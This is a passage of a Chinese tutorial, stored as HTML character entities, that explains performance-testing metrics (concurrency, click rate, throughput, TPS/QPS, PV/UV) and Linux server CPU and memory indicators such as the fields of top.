&#x4E3E;&#x4E2A;&#x4F8B;&#x5B50;&#xFF0C;&#x4E00;&#x4E2A;&#x5E76;&#x53D1;&#x91CF;&#x4E3A;10000&#x4EBA;&#xFF08;&#x53EF;&#x540C;&#x65F6;&#x5BB9;&#x7EB3;10000&#x4EBA;&#xFF09;&#x7684;&#x52A8;&#x7269;&#x56ED;&#xFF0C;&#x8FD9;&#x91CC;&#x7684;&#x5E76;&#x53D1;&#x91CF;&#x662F;&#x6307;&#x7EDD;&#x5BF9;&#x5E76;&#x53D1;&#x8FD8;&#x662F;&#x76F8;&#x5BF9;&#x5E76;&#x53D1;&#x5462;&#xFF1F;&#x6211;&#x4EEC;&#x5F88;&#x5BB9;&#x6613;&#x7406;&#x89E3;&#xFF0C;&#x8FD9;&#x4E2A;&#x5E76;&#x53D1;&#x6307;&#x7684;&#x662F;&#x76F8;&#x5BF9;&#x5E76;&#x53D1;&#xFF0C;&#x56E0;&#x4E3A;&#x6574;&#x4E2A;&#x52A8;&#x7269;&#x56ED;&#x662F;&#x4E00;&#x4E2A;&#x4EA4;&#x7EC7;&#x7684;&#x7F51;&#x72B6;&#x7ED3;&#x6784;&#xFF0C;&#x51FA;&#x5165;&#x53E3;&#x3001;&#x8001;&#x864E;&#x3001;&#x72EE;&#x5B50;&#x3001;&#x5927;&#x8C61;&#x7B49;&#x5404;&#x4E2A;&#x52A8;&#x7269;&#x7AD9;&#x70B9;&#x90FD;&#x6709;&#x5206;&#x6D41;&#x7684;&#x4F5C;&#x7528;&#xFF0C;&#x57FA;&#x672C;&#x4E0D;&#x53EF;&#x80FD;&#x51FA;&#x73B0;&#x51FA;&#x5165;&#x53E3;&#x6216;&#x8005;&#x7AD9;&#x70B9;&#x80FD;&#x591F;&#x540C;&#x65F6;&#x627F;&#x8F7D;10000&#x4EBA;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x51FA;&#x5165;&#x53E3;&#x7684;&#x5E76;&#x53D1;&#x53EF;&#x80FD;&#x53EA;&#x6709;200&#x4EBA;&#x3002;&#x56E0;&#x6B64;&#x8FD9;&#x4E2A;&#x52A8;&#x7269;&#x56ED;&#x7684;&#x4F8B;&#x5B50;&#x91CC;&#xFF0C;&#x5E76;&#x53D1;&#x91CF;10000&#x662F;&#x6307;&#x5404;&#x4E2A;&#x8282;&#x70B9;&#x7684;&#x603B;&#x548C;&#xFF0C;&#x53C2;&#x89C2;&#x8005;&#x53C2;&#x89C2;&#x52A8;&#x7269;&#x56ED;&#x6709;&#x8DEF;&#x5F84;&#x7684;&#x5148;&#x540E;&#x987A;&#x5E8F;&#xFF0C;&#x662F;&#x76F8;&#x5BF9;&#x5E76;&#x53D1;&#x7684;&#x6982;&#x5FF5;&#x3002;&#x800C;&#x51FA;&#x5165;&#x53E3;&#x7684;&#x5E76;&#x53D1;&#x91CF;&#x662F;200&#x4EBA;&#xFF0C;&#x5219;&#x662F;&#x6307;&#x540C;&#x4E00;&#x65F6;&#x95F4;&#x5728;&#x51FA;&#x5165;&#x53E3;&#x80FD;&#x591F;&#x540C;&#x65F6;&#x5BB9;&#x7EB3;200&#x4EBA;&#xFF0C;&#x8FD9;&#x5C31;&#x662F;&#x7EDD;&#x5BF9;&#x5E76;&#x53D1;&#x7684;&#x6982;&#x5FF5;&#x3002; &#x4E00;&#x822C;&#x6765;&#x8BF4;&#xFF0C;&#x5728;&#x7CFB;&#x7EDF;&#x7684;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x4E2D;&#xFF0C;&#x7CFB;&#x7EDF;&#x6216;&#x8005;&#x6A21;&#x5757;&#x7684;&#x5E76;&#x53D1;&#x66F4;&#x591A;&#x662F;&#x6307;&#x76F8;&#x5BF9;&#x5E76;&#x53D1;&#xFF0C;&#x800C;&#x63A5;&#x53E3;&#x7684;&#x5E76;&#x53D1;&#x66F4;&#x503E;&#x5411;&#x4E8E;&#x7EDD;&#x5BF9;&#x5E76;&#x53D1;&#x3002;&#x5E76;&#x53D1;&#x6027;&#x80FD;&#x7684;&#x6982;&#x5FF5;&#x662F;&#x6307;&#x7CFB;&#x7EDF;&#x3001;&#x6A21;&#x5757;&#x6216;&#x63A5;&#x53E3;&#x7A33;&#x5B9A;&#x8FD0;&#x884C;&#xFF0C;&#x4E0D;&#x629B;&#x51FA;&#x5F02;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#x6240;&#x80FD;&#x591F;&#x627F;&#x8F7D;&#x7684;&#x5E76;&#x53D1;&#x91CF;&#x3002; &#x5728;&#x5E76;&#x53D1;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x4E2D;&#x5E38;&#x7528;&#x5230;&#x5E76;&#x53D1;&#x7528;&#x6237;&#x6570;&#x548C;&#x5E76;&#x53D1;&#x8BF7;&#x6C42;&#x6570;&#x4E24;&#x4E2A;&#x6307;&#x6807;&#x3002;&#x987E;&#x540D;&#x601D;&#x4E49;&#xFF0C;&#x5E76;&#x53D1;&#x7528;&#x6237;&#x6570;&#x662F;&#x6307;&#x540C;&#x4E00;&#x65F6;&#x95F4;&#xFF08;&#x70B9;&#x6216;&#x533A;&#x95F4;&#xFF09;&#xFF0C;&#x7CFB;&#x7EDF;&#x3001;&#x6A21;&#x5757;&#x6216;&#x63A5;&#x53E3;&#x80FD;&#x591F;&#x627F;&#x8F7D;&#x7684;&#x7528;&#x6237;&#x6570;&#x91CF;&#xFF1B;&#x5E76;&#x53D1;&#x8BF7;&#x6C42;&#x6570;&#x662F;&#x6307;&#x540C;&#x4E00;&#x65F6;&#x95F4;&#xFF08;&#x70B9;&#x6216;&#x533A;&#x95F4;&#xFF09;&#xFF0C;&#x7CFB;&#x7EDF;&#x3001;&#x6A21;&#x5757;&#x6216;&#x63A5;&#x53E3;&#x80FD;&#x591F;&#x627F;&#x8F7D;&#x7684;&#x8BF7;&#x6C42;&#x6570;&#x91CF;&#x3002; 1.3 &#x70B9;&#x51FB;&#x91CF;/&#x70B9;&#x51FB;&#x7387;&#x70B9;&#x51FB;&#x91CF;&#x662F;&#x8861;&#x91CF;&#x7F51;&#x7AD9;&#x6D41;&#x91CF;&#x7684;&#x4E00;&#x4E2A;&#x6307;&#x6807;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x70B9;&#x51FB;&#x6570;clicks&#xFF0C;&#x662F;&#x5BF9;&#x7F51;&#x7AD9;&#x70B9;&#x51FB;&#x6570;&#x636E;&#x7684;&#x7EDF;&#x8BA1;&#x3002; &#x70B9;&#x51FB;&#x7387;&#xFF08;Clicks Ratio&#xFF09;&#x4E5F;&#x53EF;&#x4EE5;&#x53EB;&#x505A;&#x70B9;&#x8FDB;&#x7387;&#xFF08;&#x201C;Click-through Rate&#xFF09;&#xFF0C;&#x5B83;&#x662F;&#x7F51;&#x7AD9;&#x4E0A;&#x67D0;&#x4E00;&#x5185;&#x5BB9;&#x88AB;&#x70B9;&#x51FB;&#x7684;&#x6B21;&#x6570;&#x4E0E;&#x6574;&#x4E2A;&#x7F51;&#x7AD9;&#x5185;&#x5BB9;&#x88AB;&#x663E;&#x793A;&#x6B21;&#x6570;&#x4E4B;&#x6BD4;&#xFF0C;&#x5373;clicks/views&#x3002;&#x53CD;&#x5E94;&#x4E86;&#x7F51;&#x7AD9;&#x4E0A;&#x67D0;&#x4E00;&#x9875;&#x9762;&#x6216;&#x5185;&#x5BB9;&#x7684;&#x53D7;&#x5173;&#x6CE8;&#x7A0B;&#x5EA6;&#xFF0C;&#x7ECF;&#x5E38;&#x7528;&#x6765;&#x8861;&#x91CF;&#x5E7F;&#x544A;&#x7684;&#x5438;&#x5F15;&#x7A0B;&#x5EA6;&#x3002;&#x6BD4;&#x5982;&#x516C;&#x4F17;&#x53F7;&#x7684;&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#x88AB;&#x6D4F;&#x89C8;&#x4E86;10w&#x6B21;&#xFF0C;&#x6587;&#x7AE0;&#x4E2D;&#x7684;&#x5E7F;&#x544A;&#x94FE;&#x63A5;&#x88AB;&#x70B9;&#x51FB;&#x4E86;2000&#x6B21;&#xFF0C;&#x90A3;&#x4E48;&#x8FD9;&#x6761;&#x5E7F;&#x544A;&#x7684;&#x70B9;&#x51FB;&#x7387;&#x662F;2%&#xFF08;2000/100000*100%&#xFF09;&#x3002; &#x5728;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x9886;&#x57DF;&#xFF0C;&#x70B9;&#x51FB;&#x7387;&#xFF08;hit rate&#xFF09;&#x5E38;&#x6307;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#x5185;&#xFF08;&#x6BCF;&#x79D2;&#x949F;&#xFF09;&#x9875;&#x9762;&#x7684;&#x70B9;&#x51FB;&#x6570;&#xFF0C;&#x5373;&#x6BCF;&#x79D2;&#x949F;&#x53D1;&#x9001;&#x7684;http&#x8BF7;&#x6C42;&#x6570;&#x91CF;&#xFF0C;&#x70B9;&#x51FB;&#x7387;&#x8D8A;&#x5927;&#x5BF9;&#x670D;&#x52A1;&#x5668;&#x9020;&#x6210;&#x7684;&#x538B;&#x529B;&#x4E5F;&#x8D8A;&#x5927;&#xFF0C;&#x5BF9;&#x670D;&#x52A1;&#x5668;&#x7684;&#x6027;&#x80FD;&#x8981;&#x6C42;&#x4E5F;&#x8D8A;&#x9AD8;&#x3002; &#x6709;&#x4E9B;&#x4EBA;&#x5BB9;&#x6613;&#x6DF7;&#x6DC6;&#x70B9;&#x51FB;&#x7387;&#x548C;&#x70B9;&#x51FB;&#x91CF;&#x7684;&#x6982;&#x5FF5;&#xFF0C;&#x6BD4;&#x5982;&#x6211;&#x4EEC;&#x7ECF;&#x5E38;&#x4F1A;&#x542C;&#x5230;&#x6709;&#x4EBA;&#x8BF4;&#x67D0;&#x7F51;&#x7AD9;&#x7684;&#x70B9;&#x51FB;&#x7387;&#x662F;&#x591A;&#x591A;&#x4E07;&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;&#x8FD9;&#x91CC;&#x7684;&#x70B9;&#x51FB;&#x7387;&#x6307;&#x7684;&#x662F;&#x70B9;&#x51FB;&#x91CF;&#xFF0C;&#x66DD;&#x5149;&#x7387;&#x6216;&#x8005;&#x8BF4;&#x9875;&#x9762;&#x6D4F;&#x89C8;&#x91CF;&#x3002; 1.4 &#x541E;&#x5410;&#x91CF;/&#x541E;&#x5410;&#x7387;&#x541E;&#x5410;&#x91CF;&#x662F;&#x6307;&#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x5BA2;&#x6237;&#x8BF7;&#x6C42;&#x6570;&#x91CF;&#x7684;&#x603B;&#x548C;&#xFF0C;&#x53EF;&#x4EE5;&#x6307;&#x7F51;&#x7EDC;&#x4E0A;&#x4F20;&#x8F93;&#x6570;&#x636E;&#x5305;&#x7684;&#x603B;&#x548C;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x6307;&#x4E1A;&#x52A1;&#x4E2D;&#x5BA2;&#x6237;&#x7AEF;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x4EA4;&#x4E92;&#x6570;&#x636E;&#x91CF;&#x7684;&#x603B;&#x548C;&#x3002; &#x541E;&#x5410;&#x7387;&#x662F;&#x6307;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#x5185;&#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x5BA2;&#x6237;&#x8BF7;&#x6C42;&#x7684;&#x6570;&#x91CF;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#x5185;&#x7684;&#x541E;&#x5410;&#x91CF;&#x3002;&#x53EF;&#x4EE5;&#x4ECE;&#x591A;&#x4E2A;&#x7EF4;&#x5EA6;&#x8861;&#x91CF;&#x541E;&#x5410;&#x7387;&#xFF1A;&#x2460;&#x4E1A;&#x52A1;&#x89D2;&#x5EA6;&#xFF1A;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#xFF08;&#x6BCF;&#x79D2;&#xFF09;&#x7684;&#x8BF7;&#x6C42;&#x6570;&#x6216;&#x9875;&#x9762;&#x6570;&#xFF0C;&#x5373;&#x8BF7;&#x6C42;&#x6570;/&#x79D2;&#x6216;&#x9875;&#x9762;&#x6570;/&#x79D2;&#xFF1B;&#x2461;&#x7F51;&#x7EDC;&#x89D2;&#x5EA6;&#xFF1A;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#xFF08;&#x6BCF;&#x79D2;&#xFF09;&#x7F51;&#x7EDC;&#x4E2D;&#x4F20;&#x8F93;&#x7684;&#x6570;&#x636E;&#x5305;&#x5927;&#x5C0F;&#xFF0C;&#x5373;&#x5B57;&#x8282;&#x6570;/&#x79D2;&#x7B49;&#xFF1B;&#x2462;&#x7CFB;&#x7EDF;&#x89D2;&#x5EA6;&#xFF0C;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#x5185;&#x670D;&#x52A1;&#x5668;&#x6240;&#x627F;&#x53D7;&#x7684;&#x538B;&#x529B;&#xFF0C;&#x5373;&#x7CFB;&#x7EDF;&#x7684;&#x8D1F;&#x8F7D;&#x80FD;&#x529B;&#x3002; &#x541E;&#x5410;&#x7387;&#xFF08;&#x6216;&#x541E;&#x5410;&#x91CF;&#xFF09;&#x662F;&#x4E00;&#x79CD;&#x591A;&#x7EF4;&#x5EA6;&#x91CF;&#x7684;&#x6027;&#x80FD;&#x6307;&#x6807;&#xFF0C;&#x5B83;&#x4E0E;&#x8BF7;&#x6C42;&#x5904;&#x7406;&#x6240;&#x6D88;&#x8017;&#x7684;CPU&#x3001;&#x5185;&#x5B58;&#x3001;IO&#x548C;&#x7F51;&#x7EDC;&#x5E26;&#x5BBD;&#x90FD;&#x5F3A;&#x76F8;&#x5173;&#x3002; 1.5 TPS/QPSTPS&#xFF08;Transaction Per Second&#xFF09;&#x662F;&#x6307;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#xFF08;&#x6BCF;&#x79D2;&#xFF09;&#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x7684;&#x4E8B;&#x52A1;&#x91CF;&#x3002;&#x4E8B;&#x52A1;&#x53EF;&#x4EE5;&#x662F;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x4E00;&#x7CFB;&#x5217;&#x64CD;&#x4F5C;&#x6216;&#x8005;&#x52A8;&#x4F5C;&#x7684;&#x96C6;&#x5408;&#xFF0C;&#x6BD4;&#x5982;&#x201C;&#x7528;&#x6237;&#x6CE8;&#x518C;&#x201C;&#x4E8B;&#x52A1;&#x662F;&#x70B9;&#x51FB;&#x6CE8;&#x518C;&#x6309;&#x94AE;&#xFF0C;&#x586B;&#x5199;&#x7528;&#x6237;&#x6CE8;&#x518C;&#x4FE1;&#x606F;&#xFF0C;&#x70B9;&#x51FB;&#x63D0;&#x4EA4;&#x6309;&#x94AE;&#xFF0C;&#x4EE5;&#x53CA;&#x52A0;&#x8F7D;&#x6CE8;&#x518C;&#x6210;&#x529F;&#x9875;&#x9762;&#x7684;&#x52A8;&#x4F5C;&#x96C6;&#x5408;&#x3002; QPS&#xFF08;Query Per Second&#xFF09;&#x662F;&#x6307;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#x5185;&#x67E5;&#x8BE2;&#x6216;&#x8BBF;&#x95EE;&#x670D;&#x52A1;&#x5668;&#x7684;&#x6B21;&#x6570;&#x3002; TPS&#x548C;QPS&#x7684;&#x533A;&#x522B;&#x5728;&#x4E8E;&#x4E00;&#x4E2A;&#x4E8B;&#x52A1;&#x53EF;&#x4EE5;&#x5305;&#x542B;&#x591A;&#x6B21;&#x67E5;&#x8BE2;&#x6216;&#x8BBF;&#x95EE;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x53EA;&#x67E5;&#x8BE2;&#x6216;&#x8BBF;&#x95EE;&#x4E00;&#x6B21;&#x670D;&#x52A1;&#x5668;&#x3002;&#x5F53;&#x591A;&#x6B21;&#x67E5;&#x8BE2;&#x6216;&#x8BBF;&#x95EE;&#x65F6;&#xFF0C;&#x4E00;&#x4E2A;TPS&#x76F8;&#x5F53;&#x4E8E;&#x591A;&#x4E2A;QPS&#xFF1B;&#x5F53;&#x53EA;&#x67E5;&#x8BE2;&#x6216;&#x8BBF;&#x95EE;&#x4E00;&#x6B21;&#x65F6;&#xFF0C;&#x4E00;&#x4E2A;TPS&#x5219;&#x7B49;&#x4EF7;&#x4E8E;&#x4E00;&#x4E2A;QPS&#x3002; 1.6 PV/UVPV&#x548C;UV&#x662F;&#x8861;&#x91CF;web&#x7F51;&#x7AD9;&#x6027;&#x80FD;&#x5BB9;&#x91CF;&#x7684;&#x4E24;&#x4E2A;&#x91CD;&#x8981;&#x5EA6;&#x91CF;&#x6307;&#x6807;&#xFF0C;&#x7ECF;&#x5E38;&#x7528;&#x5728;&#x7535;&#x5B50;&#x5546;&#x52A1;&#x7F51;&#x7AD9;&#x9886;&#x57DF;&#x4E2D;&#x7528;&#x6765;&#x8861;&#x91CF;&#x7F51;&#x7AD9;&#x7684;&#x6D3B;&#x8DC3;&#x5EA6;&#x3002; PV&#xFF08;Page View&#xFF09;&#x662F;&#x9875;&#x9762;&#x7684;&#x6D4F;&#x89C8;&#x91CF;&#x6216;&#x70B9;&#x51FB;&#x91CF;&#xFF0C;&#x7528;&#x6237;&#x5BF9;&#x7CFB;&#x7EDF;&#x6216;&#x8005;&#x7F51;&#x7AD9;&#x4EFB;&#x4F55;&#x9875;&#x9762;&#x7684;&#x6BCF;&#x4E00;&#x6B21;&#x70B9;&#x51FB;&#x6216;&#x8005;&#x8BBF;&#x95EE;&#x90FD;&#x4F1A;&#x88AB;&#x8BB0;&#x5F55;&#x4E00;&#x6B21;&#x6D4F;&#x89C8;&#x91CF;&#x6216;&#x70B9;&#x51FB;&#x91CF;&#xFF0C;&#x5BF9;&#x76F8;&#x540C;&#x9875;&#x9762;&#x8FDB;&#x884C;&#x591A;&#x6B21;&#x8BBF;&#x95EE;&#x6D4F;&#x89C8;&#x91CF;&#x6216;&#x70B9;&#x51FB;&#x91CF;&#x4E5F;&#x4F1A;&#x8FDB;&#x884C;&#x7D2F;&#x8BA1;&#x3002; UV&#xFF08;Unique Vistor&#xFF09;&#x662F;&#x7CFB;&#x7EDF;&#x6216;&#x8005;&#x7F51;&#x7AD9;&#x7684;&#x72EC;&#x7ACB;&#x8BBF;&#x5BA2;&#xFF0C;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x5185;&#x76F8;&#x540C;&#x5BA2;&#x6237;&#x7AEF;&#xFF08;&#x6216;PC&#xFF09;&#x8BBF;&#x95EE;&#x7CFB;&#x7EDF;&#x6216;&#x8005;&#x7F51;&#x7AD9;&#x53EA;&#x4F1A;&#x88AB;&#x8BB0;&#x5F55;&#x4E00;&#x6B21;&#xFF0C;&#x8FDE;&#x7EED;&#x91CD;&#x590D;&#x8BBF;&#x95EE;&#x6216;&#x8005;&#x6D4F;&#x89C8;&#x591A;&#x4E2A;&#x7CFB;&#x7EDF;&#x9875;&#x9762;&#x6B21;&#x6570;&#x4E0D;&#x4F1A;&#x8FDB;&#x884C;&#x7D2F;&#x8BA1;&#x3002; PV&#x548C;UV&#x6309;&#x7167;&#x7EDF;&#x8BA1;&#x5468;&#x671F;&#x5212;&#x5206;&#xFF0C;&#x53EF;&#x4EE5;&#x5212;&#x5206;&#x4E3A;&#x5168;&#x5929;PV&#x3001;&#x6BCF;&#x5C0F;&#x65F6;PV&#x3001;&#x5168;&#x5929;UV&#x548C;&#x6BCF;&#x5C0F;&#x65F6;UV&#x7B49;&#x3002;&#x5728;&#x4E00;&#x4E9B;&#x6570;&#x636E;&#x6216;&#x4EA4;&#x6613;&#x91CF;&#x975E;&#x5E38;&#x5E9E;&#x5927;&#x7684;&#x573A;&#x666F;&#x4E2D;&#xFF0C;&#x6BD4;&#x5982;&#x53CC;11&#x6216;618&#x7B49;&#x5168;&#x6C11;&#x8D2D;&#x7269;&#x6D3B;&#x52A8;&#x65F6;&#xFF0C;&#x5E38;&#x5E38;&#x8FD8;&#x4F1A;&#x7EDF;&#x8BA1;&#x5CF0;&#x503C;PV&#x548C;&#x5CF0;&#x503C;UV&#x3002; Linux&#x670D;&#x52A1;&#x5668;&#x6027;&#x80FD;&#x6307;&#x6807;2.1 CPU&#x4F7F;&#x7528;&#x7387;CPU&#x4F7F;&#x7528;&#x7387;&#x662F;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#x5185;&#x670D;&#x52A1;&#x5668;CPU&#x7684;&#x4F7F;&#x7528;&#x7EDF;&#x8BA1;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x9664;CPU&#x7A7A;&#x95F2;&#x65F6;&#x95F4;&#x5916;&#x5176;&#x4ED6;&#x65F6;&#x95F4;&#x5360;&#x603B;CPU&#x65F6;&#x95F4;&#x7684;&#x767E;&#x5206;&#x6BD4;&#x6765;&#x8868;&#x793A;&#xFF0C;&#x5373;&#xFF1A;CPU&#x4F7F;&#x7528;&#x7387;=1-CPU&#x7A7A;&#x95F2;&#x65F6;&#x95F4;/&#x603B;CPU&#x65F6;&#x95F4; 1top ## top&#x547D;&#x4EE4;&#x95F4;&#x9694;3s&#x4F1A;&#x52A8;&#x6001;&#x6EDA;&#x52A8;&#x66F4;&#x65B0;&#x4E00;&#x6B21;&#x6570;&#x636E; &#x5B57;&#x6BB5;&#x8BF4;&#x660E;&#xFF1A; us (user)&#xFF1A;&#x7528;&#x6237;&#x6001;&#x7684;CPU&#x4F7F;&#x7528;&#x65F6;&#x95F4;&#x6BD4;&#x4F8B;&#xFF0C;&#x662F;&#x7528;&#x6237;&#x8FD0;&#x884C;&#x7A0B;&#x5E8F;&#x7684;&#x771F;&#x6B63;&#x65F6;&#x95F4;&#xFF0C;&#x5B83;&#x4E0D;&#x5305;&#x62EC;&#x540E;&#x9762;&#x7684;ni&#x65F6;&#x95F4;&#xFF1B; sy (system): &#x5185;&#x6838;&#x6001;&#x7684;CPU&#x4F7F;&#x7528;&#x65F6;&#x95F4;&#x6BD4;&#x4F8B;&#xFF0C;&#x662F;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7684;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#xFF0C;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8FD0;&#x884C;&#x65F6;&#xFF0C;&#x7528;&#x6237;&#x8FD0;&#x884C;&#x7A0B;&#x5E8F;&#x5F80;&#x5F80;&#x5904;&#x4E8E;&#x7B49;&#x5F85;&#x72B6;&#x6001;&#xFF1B; ni (nice): &#x8868;&#x793A;&#x4F4E;&#x4F18;&#x5148;&#x7EA7;&#x7528;&#x6237;&#x6001;&#x7684;CPU&#x65F6;&#x95F4;&#x6BD4;&#x4F8B;&#xFF0C;&#x53D6;&#x503C;&#x8303;&#x56F4;&#x4E3A;[-20,19]&#xFF0C;&#x6570;&#x503C;&#x8D8A;&#x5927;&#xFF0C;&#x5219;&#x4F18;&#x5148;&#x7EA7;&#x8D8A;&#x4F4E;&#xFF1B; id (idle): &#x8868;&#x793A;&#x7A7A;&#x95F2;&#x7684;CPU&#x65F6;&#x95F4;&#x6BD4;&#x4F8B;&#xFF0C;&#x503C;&#x8D8A;&#x5927;&#xFF0C;CPU&#x7A7A;&#x95F2;&#x65F6;&#x95F4;&#x6BD4;&#x4F8B;&#x8D8A;&#x9AD8;&#xFF0C;&#x5229;&#x7528;&#x7387;&#x8D8A;&#x4F4E;&#xFF1B; wa (iowait): &#x8868;&#x793A;&#x5904;&#x4E8E;IO&#x7B49;&#x5F85;&#x72B6;&#x6001;&#x7684;CPU&#x65F6;&#x95F4;&#x6BD4;&#x4F8B;&#xFF1B; hi (hard interrupt): &#x8868;&#x793A;&#x5904;&#x7406;&#x786C;&#x4E2D;&#x65AD;&#x7684;CPU&#x65F6;&#x95F4;&#x6BD4;&#x4F8B;&#xFF1B; si (soft interrupt): &#x4E0E;hi&#x76F8;&#x53CD;&#xFF0C;&#x8868;&#x793A;&#x5904;&#x7406;&#x8F6F;&#x4E2D;&#x65AD;&#x7684;CPU&#x65F6;&#x95F4;&#x6BD4;&#x4F8B;&#xFF1B; st (steal): &#x8868;&#x793A;&#x5F53;&#x524D;&#x7CFB;&#x7EDF;&#x8FD0;&#x884C;&#x5728;&#x865A;&#x62DF;&#x673A;&#x4E2D;&#x88AB;&#x5176;&#x4ED6;&#x865A;&#x62DF;&#x673A;&#x5360;&#x7528;&#x7684;CPU&#x65F6;&#x95F4;&#x6BD4;&#x4F8B;&#x3002; &#x5728;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x4E2D;&#xFF0C;&#x7CFB;&#x7EDF;&#x6574;&#x4F53;&#x7684;CPU&#x4F7F;&#x7528;&#x7387;&#x53EF;&#x4EE5;&#x7528;&#xFF08;1-id&#xFF09;&#x6765;&#x8BA1;&#x7B97;&#x3002;&#x5F53;us&#x5F88;&#x9AD8;&#x65F6;&#xFF0C;&#x8BF4;&#x660E;CPU&#x65F6;&#x95F4;&#x4E3B;&#x8981;&#x6D88;&#x8017;&#x5728;&#x7528;&#x6237;&#x4EE3;&#x7801;&#x4E0A;&#xFF0C;&#x53EF;&#x4EE5;&#x4ECE;&#x7528;&#x6237;&#x4EE3;&#x7801;&#x89D2;&#x5EA6;&#x8003;&#x8651;&#x4F18;&#x5316;&#x6027;&#x80FD;&#xFF1B;&#x5F53;sy&#x5F88;&#x9AD8;&#x65F6;&#xFF0C;&#x8BF4;&#x660E;CPU&#x65F6;&#x95F4;&#x4E3B;&#x8981;&#x6D88;&#x8017;&#x5728;&#x5185;&#x6838;&#x4E0A;&#xFF0C;&#x53EF;&#x4EE5;&#x4ECE;&#x662F;&#x5426;&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#x9891;&#x7E41;&#x3001;CPU&#x8FDB;&#x7A0B;&#x6216;&#x7EBF;&#x7A0B;&#x5207;&#x6362;&#x9891;&#x7E41;&#x89D2;&#x5EA6;&#x8003;&#x8651;&#x6027;&#x80FD;&#x7684;&#x4F18;&#x5316;&#xFF1B;&#x5F53;wa&#x5F88;&#x9AD8;&#x65F6;&#xFF0C;&#x8BF4;&#x660E;&#x6709;&#x8FDB;&#x7A0B;&#x5728;&#x8FDB;&#x884C;&#x9891;&#x7E41;&#x7684;IO&#x64CD;&#x4F5C;&#xFF0C;&#x53EF;&#x80FD;&#x662F;&#x78C1;&#x76D8;IO&#x6216;&#x8005;&#x7F51;&#x7EDC;IO&#x3002; &#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5982;&#x679C;%us+%sy&lt;=70%&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8BA4;&#x4E3A;&#x7CFB;&#x7EDF;&#x7684;&#x8FD0;&#x884C;&#x72B6;&#x6001;&#x826F;&#x597D;&#x3002; 2.2 &#x5185;&#x5B58;&#x5360;&#x7528;&#x7387;Linux&#x7684;&#x7CFB;&#x7EDF;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#x673A;&#x5236;&#x9075;&#x5FAA;&#x5185;&#x5B58;&#x5229;&#x7528;&#x7387;&#x6700;&#x5927;&#x5316;&#x7684;&#x539F;&#x5219;&#x3002;&#x5185;&#x6838;&#x4F1A;&#x5C06;&#x7A7A;&#x4F59;&#x7684;&#x5185;&#x5B58;&#x5212;&#x5206;&#x4E3A;cached&#xFF08;&#x4E0D;&#x5C5E;&#x4E8E;free&#xFF09;&#xFF0C;&#x5BF9;&#x4E8E;&#x6709;&#x9891;&#x7E41;&#x8BFB;&#x53D6;&#x64CD;&#x4F5C;&#x7684;&#x6587;&#x4EF6;&#x6216;&#x6570;&#x636E;&#x4F1A;&#x88AB;&#x4FDD;&#x5B58;&#x5728;cached&#x4E2D;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x5BF9;&#x4E8E;linux&#x7CFB;&#x7EDF;&#x6765;&#x8BF4;&#xFF0C;&#x53EF;&#x7528;&#x4E8E;&#x5206;&#x914D;&#x7684;&#x5185;&#x5B58;&#x4E0D;&#x6B62;free&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x540C;&#x65F6;&#x8FD8;&#x5305;&#x62EC;cached&#x7684;&#x5185;&#x5B58;&#xFF08;&#x5176;&#x5B9E;&#x8FD8;&#x5305;&#x62EC;buffers&#x7684;&#x5185;&#x5B58;&#xFF09;&#x3002; cached&#x548C;buffers&#x90FD;&#x5C5E;&#x4E8E;&#x7F13;&#x5B58;&#xFF0C;&#x5B83;&#x4EEC;&#x7684;&#x533A;&#x522B;&#x4E3B;&#x8981;&#x5728;&#x4E8E;cached&#x4E3B;&#x8981;&#x7528;&#x6765;&#x7F13;&#x51B2;&#x9891;&#x7E41;&#x8BFB;&#x53D6;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x5B83;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8BB0;&#x5FC6;&#x6211;&#x4EEC;&#x6253;&#x5F00;&#x7684;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#xFF1B;&#x800C;buffers&#x4E3B;&#x8981;&#x7528;&#x6765;&#x7ED9;&#x5757;&#x8BBE;&#x5907;&#x505A;&#x7684;&#x7F13;&#x51B2;&#x5927;&#x5C0F;&#xFF0C;&#x53EA;&#x8BB0;&#x5F55;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x7684;metadata&#x4EE5;&#x53CA;tracking in-flight 